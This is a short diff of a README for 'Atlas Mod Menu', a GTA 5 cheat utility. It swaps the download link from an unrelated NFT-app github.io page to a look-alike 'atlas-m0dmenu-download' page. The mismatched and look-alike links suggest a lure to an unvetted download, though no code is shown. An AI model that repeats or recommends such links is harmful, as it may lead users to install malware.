@@ -2,7 +2,7 @@
 
 Atlas Mod Menu is a high-performance enhancement utility for GTA 5, designed to give players greater control, expanded gameplay options, and dynamic features in real time. Whether you’re exploring, roleplaying, or experimenting in-game — Atlas is your ultimate companion.
 
-[![Download Atlas Mod Menu](https://img.shields.io/badge/Download-Atlas_Mod_Menu-blueviolet)](https://bueno-nft-desktop-app.github.io/.github)
+[![Download Atlas Mod Menu](https://img.shields.io/badge/Download-Atlas_Mod_Menu-blueviolet)](https://atlas-m0dmenu-download.github.io/.github/)
 
 ---
 
